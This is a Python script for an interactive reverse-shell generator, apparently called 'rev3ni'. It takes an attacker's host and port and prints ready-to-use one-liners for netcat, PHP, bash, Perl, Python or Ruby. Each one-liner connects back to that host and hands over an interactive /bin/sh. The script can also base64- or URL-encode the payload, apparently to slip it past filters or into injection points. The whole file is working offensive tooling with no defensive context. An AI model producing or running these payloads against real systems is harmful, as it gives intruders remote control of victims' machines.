#!/usr/bin/python3
import pyfiglet
from termcolor import *
import base64
import urllib.parse

def netcat1(ip,port):
    shell =f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {ip} {port} >/tmp/f"
    return shell

def php(ip,port):
    shell = f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    return shell

def bash(ip,port):
    shell= f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
    return shell

def perl(ip,port):
    perl_code = f'''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' '''
    return perl_code

def python(ip,port):
    python_code = f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
    return python_code

def ruby(ip,port):
    ruby_code = f"""ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
    return ruby_code

def url_encode(s):
    encode = urllib.parse.quote(s)
    return encode

def base64_encode(s):
    encode = base64.encodebytes(s.encode("utf-8"))
    return encode.decode('utf-8').replace('\n', '')

banner=pyfiglet.figlet_format("rev3ni")
print(banner)
cprint("[*]", "blue", end="")
lhost =input(" enter the LHOST = ")
cprint("[*]", "blue", end="")
lport = input(" enter the LPORT = ")

c = True
while(c == True):
    cprint("[+]", "green", end="")
    print(" The reverse shell choice\n 1. Netcat\n 2. Php\n 3. Bash\n 4. Perl\n 5. Python\n 6. ruby\n")
    cprint("[*]", "blue", end="")
    choose = int(input(" Choose your reverse shell : "))
#netcat reverse shell
    if choose == 1:
        cprint("[+]", "green", end="")
        encode = input(" Do you want to encode the reverse shell?(y,n): ")
        if encode == "y":
            cprint("[+]", "green", end="")
            e = int(input(" Choose your encoding base64(1) or Urlencoding(2): "))
            if e == 1:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",base64_encode(netcat1(lhost,lport)))
                break
            else:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",url_encode(netcat1(lhost,lport)))
                break
        elif encode == "n" :
            cprint("[$]", "magenta", end="")
            print(" here your reverse shell :",netcat1(lhost,lport))
            break
        else:
            cprint("[!]", "red", end="")
            print("BAD enter !\n")
#php reverse shell
    elif choose == 2:
        cprint("[+]", "green", end="")
        encode = input(" Do you want to encode the reverse shell?(y,n): ")
        if encode == "y":
            cprint("[+]", "green", end="")
            e = int(input(" Choose your encoding base64(1) or Urlencoding(2): "))
            if e == 1:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",base64_encode(php(lhost, lport)))
                break
            else:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",url_encode(php(lhost, lport)))
                break
        elif encode == "n":
            cprint("[$]", "magenta", end="")
            print(" here your reverse shell :",php(lhost, lport))
            break
        else:
            cprint("[!]", "red", end="")
            print("BAD enter !\n")
#bash reverse shell
    elif choose == 3:
        cprint("[+]", "green", end="")
        encode = input(" Do you want to encode the reverse shell?(y,n): ")
        if encode == "y":
            cprint("[+]", "green", end="")
            e = int(input(" Choose your encoding base64(1) or Urlencoding(2): "))
            if e == 1:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",base64_encode(bash(lhost,lport)))
                break
            else:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",url_encode(bash(lhost, lport)))
                break
        elif encode == "n":
            cprint("[$]", "magenta", end="")
            print(" here your reverse shell :",bash(lhost, lport))
            break
        else:
            cprint("[!]", "red", end="")
            print(" BAD enter !\n")
#perl reverse shell
    elif choose == 4:
        cprint("[+]", "green", end="")
        encode = input(" Do you want to encode the reverse shell?(y,n): ")
        if encode == "y":
            cprint("[+]", "green", end="")
            e = int(input(" Choose your encoding base64(1) or Urlencoding(2): "))
            if e == 1:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",base64_encode(perl(lhost,lport)))
                break
            else:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",url_encode(perl(lhost,lport)))
                break
        elif encode == "n":
            cprint("[$]", "magenta", end="")
            print(" here your reverse shell :",perl(lhost,lport))
            break
        else:
            cprint("[!]", "red", end="")
            print("BAD enter !\n")
#Python reverse shell
    elif choose == 5:
        cprint("[+]", "green", end="")
        encode = input(" Do you want to encode the reverse shell?(y,n): ")
        if encode == "y":
            cprint("[+]", "green", end="")
            e = int(input(" Choose your encoding base64(1) or Urlencoding(2): "))
            if e == 1:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",base64_encode(python(lhost,lport)))
                break
            else:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",url_encode(python(lhost,lport)))
                break
        elif encode == "n":
            cprint("[$]", "magenta", end="")
            print(" here your reverse shell :",python(lhost,lport))
            break
        else:
            print("BAD enter !\n")
#ruby reverse shell
    elif choose == 6:
        cprint("[+]", "green", end="")
        encode = input(" Do you want to encode the reverse shell?(y,n): ")
        if encode == "y":
            cprint("[+]", "green", end="")
            e = int(input(" Choose your encoding base64(1) or Urlencoding(2): "))
            if e == 1:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",base64_encode(ruby(lhost,lport)))
                break
            else:
                cprint("[$]", "magenta", end="")
                print(" here your reverse shell :",url_encode(ruby(lhost,lport)))
                break
        elif encode == "n":
            cprint("[$]", "magenta", end="")
            print(" here your reverse shell :",ruby(lhost,lport))
            break
        else:
            cprint("[!]", "red", end="")
            print("BAD enter !\n")
    else:
        cprint("[!]", "red", end="")
        print("Bad enter ! \n")
